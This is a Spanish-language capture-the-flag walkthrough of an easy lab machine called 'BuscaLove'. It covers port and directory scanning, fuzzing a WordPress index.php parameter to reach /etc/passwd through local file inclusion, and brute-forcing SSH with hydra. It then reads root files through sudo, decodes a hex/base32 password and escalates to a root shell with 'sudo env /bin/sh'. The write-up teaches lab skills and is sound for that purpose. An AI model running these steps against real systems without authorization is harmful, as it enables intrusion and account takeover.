Maquina: BuscaLove

Autor: Prendelo

Dificultad: Facil

ping 172.18.0.2 -c 1 

sudo nmap -p- --open -sCV --min-rate 5000 -sS -Pn -n 172.18.0.2 -vvv 

Vamos a la web y encontramos la pagina de apache2.

Realizamos un escaneo de directorios y encontramos un directorio llamado WordPress.

gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://172.18.0.2

Al dirigirnos a esa dirección podemos ver que se trata de una página muy simple en la cual los enlaces no redireccionan a ninguna página.

Realizamos un escaneo para ver si encontramos algún archivo o carpeta, pero no obtenemos nada, solo sabemos que el index es index.php.

gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://172.18.0.2

Probamos a realizar fuzzing para ver si es posible listar algún archivo. Como no sabemos que archivo encontrar nos apoyaremos del passwd y si lo encuentra podemos también saber que existe un posible LFI

Enviamos el comando y podemos observar que el parámetro es love.

wfuzz -c --hc=404,115 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt http://172.18.0.2/wordpress/index.php?FUZZ=../../../../../etc/passwd | grep -v 1040

Si ingresamos la URL en el navegador y vamos al view-source podemos observar con mayor facilidad el passwd.

view-source:http://172.18.0.2/wordpress/index.php?love=../../../../etc/passwd

No solo observamos que es posible un LFI, sino que también tenemos dos usuarios, rosa y pedro,

Aplicamos fureza bruta con hydra

hydra -l rosa -P /usr/share/wordlists/rockyou.txt ssh://172.18.0.2 -s 22 -t 64

encontramos en password: lovebug

Nos metemos por ssh con los credenciales encontrados

ssh rosa@172.18.0.2
lovebug

sudo -l

Tenemos dos binarios que nos pueden ser de utilidad, en el caso de ls nos permite listar archivos como root y usando cat de esta manera podemos leerlos.

sudo /usr/bin/ls /root

Haciendo uso de cat procedemos a leer el archivo y observamos que es un archivo al parecer en formato hexadecimal.

Copiamos este texto cifrado en la página de CyberChef y podemos observar que primero el texto estaba en formato Hexadecimal y luego en base 32, pero transformando ambos podemos observar que el texto era noacertarasosi.

Pobamos las credenciales encontradas con el usuario pedro.

su pedro
noacertarasosi

sudo -l

sudo env /bin/sh

whoami




